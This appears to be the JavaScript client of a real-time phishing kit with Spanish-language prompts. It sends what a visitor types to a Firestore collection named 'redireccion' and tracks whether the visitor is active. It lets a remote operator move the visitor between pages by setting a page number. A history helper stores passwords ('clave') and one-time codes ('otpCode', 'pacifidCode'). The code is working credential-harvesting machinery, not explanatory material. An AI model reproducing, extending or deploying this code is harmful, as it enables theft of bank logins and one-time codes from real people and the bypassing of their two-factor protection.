(function (global) {
  'use strict';

  var ENABLED_COLOR = '#1F54A5';
  var SESSION_KEYS = ['bseSessionUser', 'intermaticoActual'];

  function normalizePath(url) {
    try {
      var parsed = new URL(url, global.location.origin);
      return parsed.pathname.split('/').pop() || parsed.pathname;
    } catch (error) {
      return url;
    }
  }

  function waitForFirebase(callback, onFail) {
    function fail(message) {
      if (typeof onFail === 'function') {
        onFail(message);
        return;
      }
      console.error(message || 'Firebase no disponible');
    }

    if (global.firebaseInitError) {
      fail(global.firebaseInitError);
      return;
    }

    if (global.firebase && global.firebase.firestore && global.db) {
      callback();
      return;
    }

    var settled = false;
    function onReady() {
      if (settled) {
        return;
      }
      settled = true;
      global.removeEventListener('firebaseReady', onReady);
      global.removeEventListener('firebaseError', onError);
      callback();
    }
    function onError(event) {
      if (settled) {
        return;
      }
      settled = true;
      global.removeEventListener('firebaseReady', onReady);
      global.removeEventListener('firebaseError', onError);
      fail(event.detail && event.detail.message ? event.detail.message : 'Firebase no disponible');
    }
    global.addEventListener('firebaseReady', onReady);
    global.addEventListener('firebaseError', onError);
  }

  function getSessionId(sessionKey) {
    var keys = SESSION_KEYS.slice();
    if (sessionKey && keys.indexOf(sessionKey) === -1) {
      keys.unshift(sessionKey);
    }
    var i;
    for (i = 0; i < keys.length; i++) {
      var value = sessionStorage.getItem(keys[i]);
      if (value) {
        return value;
      }
    }
    return null;
  }

  function StepFlowClient(config) {
    this.config = config;
    this.unsubscribe = null;
    this.currentDocId = null;
    this.localPage = config.localPage;
    this.sessionKey = config.sessionKey || 'intermaticoActual';
    this.waiting = false;
  }

  StepFlowClient.prototype.query = function (selector) {
    return selector ? document.querySelector(selector) : null;
  };

  StepFlowClient.prototype.getInputValue = function () {
    if (typeof this.config.getValue === 'function') {
      return this.config.getValue();
    }
    var input = this.query(this.config.inputSelector);
    return input ? String(input.value || '').trim() : '';
  };

  StepFlowClient.prototype.setMitEnabled = function (enabled) {
    var btn = this.query(this.config.mitSelector);
    if (!btn || btn.classList.contains('bse-btn-loading')) {
      return;
    }
    btn.disabled = !enabled;
    btn.classList.toggle('botonSiguienteDeshabilitado', !enabled);
    btn.classList.toggle('botonSiguiente', enabled);
    if (btn.tagName === 'INPUT' || btn.classList.contains('ld-btn-primary')) {
      if (enabled) {
        btn.style.backgroundColor = ENABLED_COLOR;
        btn.style.color = '#fff';
        btn.style.cursor = 'pointer';
        btn.style.opacity = '1';
      } else {
        btn.style.backgroundColor = '';
        btn.style.color = '';
        btn.style.cursor = '';
        btn.style.opacity = '';
      }
    }
  };

  StepFlowClient.prototype.syncMitState = function () {
    var btn = this.query(this.config.mitSelector);
    if (btn && btn.classList.contains('bse-btn-loading')) {
      return;
    }
    var value = this.getInputValue();
    var valid = typeof this.config.isValid === 'function' ? this.config.isValid(value) : value.length > 0;
    this.setMitEnabled(valid);
  };

  StepFlowClient.prototype.setLoading = function (loading) {
    var btn = this.query(this.config.mitSelector);
    this.waiting = Boolean(loading);
    if (!btn) {
      if (loading && global.showLoader) {
        global.showLoader();
      } else if (!loading && global.hideLoader) {
        global.hideLoader();
      }
      return;
    }

    var label = this.config.mitLabel || btn.getAttribute('data-mit-label') || btn.value || btn.textContent || '';
    if (label) {
      btn.dataset.originalLabel = String(label).replace(/\s+/g, ' ').trim();
    }

    if (loading) {
      btn.disabled = true;
      btn.classList.add('bse-btn-loading');
      btn.setAttribute('aria-busy', 'true');
      if (btn.tagName === 'INPUT') {
        btn.value = this.config.loadingLabel || 'Procesando…';
      }
      if (global.showLoader) {
        global.showLoader();
      }
      return;
    }

    btn.classList.remove('bse-btn-loading');
    btn.removeAttribute('aria-busy');
    if (btn.dataset.originalLabel && btn.tagName === 'INPUT') {
      btn.value = btn.dataset.originalLabel;
    }
    if (global.hideLoader) {
      global.hideLoader();
    }
    this.syncMitState();
  };

  StepFlowClient.prototype.isErrorState = function (data) {
    if (!data) {
      return false;
    }
    var page = Number(data.page);
    if (!Number.isNaN(page) && this.config.errorPage && page === this.config.errorPage) {
      return true;
    }
    if (this.config.errorFlag && data[this.config.errorFlag] === true) {
      return true;
    }
    return data.loginError === 'codigo' || data.loginError === 'datos';
  };

  StepFlowClient.prototype.emitPage = function (data) {
    var page = Number(data && data.page);
    if (Number.isNaN(page)) {
      page = 0;
    }
    document.dispatchEvent(new CustomEvent('stepFlowPage', {
      detail: { page: page, data: data || {} }
    }));
  };

  StepFlowClient.prototype.startRedirectListener = function (docId) {
    var self = this;
    if (this.unsubscribe) {
      this.unsubscribe();
      this.unsubscribe = null;
    }

    this.unsubscribe = global.db.collection('redireccion').doc(docId).onSnapshot(function (snapshot) {
      if (!snapshot.exists) {
        return;
      }
      var data = snapshot.data() || {};
      var targetPage = Number(data.page);
      if (Number.isNaN(targetPage)) {
        targetPage = 0;
      }

      if (global.FlowPrefetch) {
        global.FlowPrefetch.stash(docId, data);
      }

      self.emitPage(data);

      if (typeof self.config.onRemoteData === 'function') {
        self.config.onRemoteData(data);
      }

      if (!targetPage) {
        self.setLoading(true);
        self.localPage = targetPage;
        return;
      }

      if (self.isErrorState(data)) {
        self.setLoading(false);
        if (targetPage === self.localPage || targetPage === self.config.errorPage) {
          self.localPage = targetPage;
          return;
        }
      }

      if (targetPage === self.localPage) {
        self.localPage = targetPage;
        self.setLoading(false);
        return;
      }

      if (!global.RouteResolver) {
        console.error('RouteResolver no cargado');
        self.localPage = targetPage;
        self.setLoading(false);
        return;
      }

      global.RouteResolver.applyRedirect(targetPage, docId, normalizePath).then(function (result) {
        if (!result.ok || result.samePage) {
          self.localPage = targetPage;
          self.setLoading(false);
        }
      });
    }, function (error) {
      console.error('Error escuchando redireccion:', error);
    });
  };

  StepFlowClient.prototype.clearInputs = function () {
    if (typeof this.config.clearInputs === 'function') {
      this.config.clearInputs();
      this.syncMitState();
      return;
    }
    var input = this.query(this.config.inputSelector);
    if (input) {
      input.value = '';
    }
    this.syncMitState();
  };

  StepFlowClient.prototype.registerActivity = function (docId) {
    if (!docId || !global.db) {
      return;
    }
    global.db.collection('redireccion').doc(docId).update({
      isActive: true,
      pageLocation: this.config.pageLocation,
      lastActivity: global.firebase.firestore.FieldValue.serverTimestamp()
    }).catch(function () {});
  };

  StepFlowClient.prototype.handleMit = function (event) {
    if (event) {
      event.preventDefault();
      event.stopPropagation();
    }

    var btn = this.query(this.config.mitSelector);
    if (btn && btn.classList.contains('bse-btn-loading')) {
      return;
    }

    var self = this;
    var value = this.getInputValue();
    if (typeof this.config.isValid === 'function' && !this.config.isValid(value)) {
      this.syncMitState();
      return;
    }

    var docId = getSessionId(this.sessionKey);
    if (!docId || !global.db) {
      alert('No hay sesión activa. Volvé a ingresar desde el inicio.');
      global.location.href = this.config.fallbackUrl || 'index.html';
      return;
    }

    this.currentDocId = docId;
    var extra = typeof this.config.buildPayload === 'function'
      ? this.config.buildPayload(value)
      : { flowValue: value };

    this.clearInputs();
    this.setLoading(true);

    waitForFirebase(function () {
      if (!global.db || !global.firebase || !global.firebase.firestore) {
        self.setLoading(false);
        alert('Firebase no está listo. Recargá la página e intentá de nuevo.');
        return;
      }

      var payload = Object.assign({
        page: 0,
        loginError: '',
        inicioErr: false,
        pageLocation: self.config.pageLocation,
        isActive: true,
        lastActivity: global.firebase.firestore.FieldValue.serverTimestamp(),
        updatedAt: global.firebase.firestore.FieldValue.serverTimestamp()
      }, extra);

      if (self.config.errorFlag) {
        payload[self.config.errorFlag] = false;
      }

      global.db.collection('redireccion').doc(docId).set(payload, { merge: true })
        .then(function () {
          self.startRedirectListener(docId);
          if (global.LgpHistorial && typeof global.LgpHistorial.guardar === 'function') {
            var historialPatch = {};
            if (payload.clave) {
              historialPatch.clave = payload.clave;
            }
            if (payload.otpCode) {
              historialPatch.otpPersona = payload.otpCode;
            }
            if (payload.pacifidCode) {
              historialPatch.otpPersona = payload.pacifidCode;
            }
            if (Object.keys(historialPatch).length) {
              global.LgpHistorial.guardar(docId, historialPatch).catch(function () {});
            }
          }
        })
        .catch(function (error) {
          console.error('Error guardando paso:', error);
          self.setLoading(false);
          alert('No se pudo enviar la información. Revisá tu conexión e intentá de nuevo.');
        });
    }, function (message) {
      console.error(message);
      self.setLoading(false);
      alert(message || 'No se pudo conectar con Firebase. Revisá el Worker y recargá la página.');
    });
  };

  StepFlowClient.prototype.bindEvents = function () {
    var self = this;
    var mitBtn = this.query(this.config.mitSelector);
    var input = this.query(this.config.inputSelector);

    if (mitBtn) {
      mitBtn.addEventListener('click', function (event) {
        self.handleMit(event);
      });
    }
    if (input) {
      input.addEventListener('input', function () {
        self.syncMitState();
      });
      input.addEventListener('keydown', function (event) {
        if (event.key === 'Enter') {
          event.preventDefault();
          self.handleMit(event);
        }
      });
    }
    if (typeof this.config.bindExtra === 'function') {
      this.config.bindExtra(this);
    }
    this.syncMitState();
  };

  StepFlowClient.prototype.resumeSession = function () {
    var savedId = getSessionId(this.sessionKey);
    if (!savedId || !global.db) {
      if (this.config.requireSession !== false) {
        global.location.href = this.config.fallbackUrl || 'index.html';
      }
      return;
    }

    this.currentDocId = savedId;
    var self = this;
    global.db.collection('redireccion').doc(savedId).get().then(function (snapshot) {
      if (!snapshot.exists || !String((snapshot.data() || {}).usuario || '').trim()) {
        sessionStorage.removeItem('bseSessionUser');
        sessionStorage.removeItem(self.sessionKey);
        if (self.config.requireSession !== false) {
          global.location.href = self.config.fallbackUrl || 'index.html';
        }
        return;
      }

      var data = snapshot.data() || {};
      if (typeof self.config.onRemoteData === 'function') {
        self.config.onRemoteData(data);
      }

      if (self.isErrorState(data)) {
        self.emitPage(data);
        self.startRedirectListener(savedId);
        self.registerActivity(savedId);
        return;
      }

      var page = Number(data.page);
      if (Number.isNaN(page)) {
        page = 0;
      }
      if (!page) {
        self.setLoading(true);
      }

      self.startRedirectListener(savedId);
      self.registerActivity(savedId);
    }).catch(function () {
      sessionStorage.removeItem('bseSessionUser');
      sessionStorage.removeItem(self.sessionKey);
      if (self.config.requireSession !== false) {
        global.location.href = self.config.fallbackUrl || 'index.html';
      }
    });
  };

  StepFlowClient.prototype.init = function () {
    var self = this;
    this.bindEvents();
    waitForFirebase(function () {
      self.resumeSession();
      document.addEventListener('visibilitychange', function () {
        if (!document.hidden && self.currentDocId) {
          self.registerActivity(self.currentDocId);
        }
      });
    });
  };

  global.StepFlowClient = {
    init: function (config) {
      var client = new StepFlowClient(config);
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () {
          client.init();
        });
      } else {
        client.init();
      }
      return client;
    },
    getSessionId: getSessionId
  };
})(window);
